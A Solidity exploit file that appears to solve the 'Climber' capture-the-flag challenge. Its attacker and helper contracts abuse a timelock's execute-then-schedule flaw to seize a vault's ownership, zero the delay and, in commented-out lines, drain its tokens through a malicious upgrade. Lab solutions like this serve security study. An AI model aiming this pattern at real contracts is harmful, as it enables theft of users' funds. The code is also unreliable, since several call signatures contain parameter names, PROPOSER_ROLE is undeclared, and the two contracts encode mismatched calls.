// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../climber/ClimberTimelock.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "../climber/ClimberVault.sol";

contract Middleman{
    function schedule(ClimberTimelock timelock, ClimberVault vault, address attacker) external{

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        values[0] = values[1] = values[2] = values[3] = 0;
        // transfer ownership
        targets[0] = address(vault);
        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);
        
        // set proposer
        targets[1] = address(timelock);
        dataElements[1] = abi.encodeWithSignature("_setupRole(bytes32 role, address account)", PROPOSER_ROLE, address(this));

        // call middleMan
        targets[2] = address(this);
        dataElements[2] = abi.encodeWithSignature("schedule(ClimberTimelock timelock, ClimberVault vault, address attacker)",timelock,vault,attacker); 

        //setup delay
        targets[3] = address(timelock);
        dataElements[3] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);

        timelock.schedule(
        targets,
        values,
        dataElements,
        keccak256("Attacking")    
        );
    }
}

contract MalciousImp{
    function withdraw(address token, address receiver) external{
        SafeTransferLib.safeTransfer(token, receiver, IERC20(token).balanceOf(address(this)));
    }
}

contract AttackerClimeberTimelock{
    ClimberTimelock immutable private timelock;
    ClimberVault immutable private vault;
    address immutable token;
    address immutable owner;
    constructor(address payable _timelock , address _vault, address _token){
        owner = msg.sender;
        timelock = ClimberTimelock(_timelock);
        vault = ClimberVault(_vault);
        token = _token;
    }

    function attack() external{
        Middleman middle = new Middleman();
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        values[0] = values[1] = values[2] = values[3] = 0;
        // transfer ownership
        targets[0] = address(vault);
        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", address(this));
        
        // set proposer
        targets[1] = address(timelock);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32, address account)",PROPOSER_ROLE, address(middle));

        // call middleMan
        targets[2] = address(middle);
        dataElements[2] = abi.encodeWithSignature("schedule(ClimberTimelock timelock, ClimberVault vault, address attacker)",timelock,vault,address(this)); 

        //setup delay
        targets[3] = address(timelock);
        dataElements[3] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);

        timelock.execute(
            targets, 
            values, 
            dataElements, 
            keccak256("Attacking")
        );
        // MalciousImp imp = new MalciousImp();
        // vault.upgradeTo(address(imp));
        // imp.withdraw(token, owner);
    }
    

}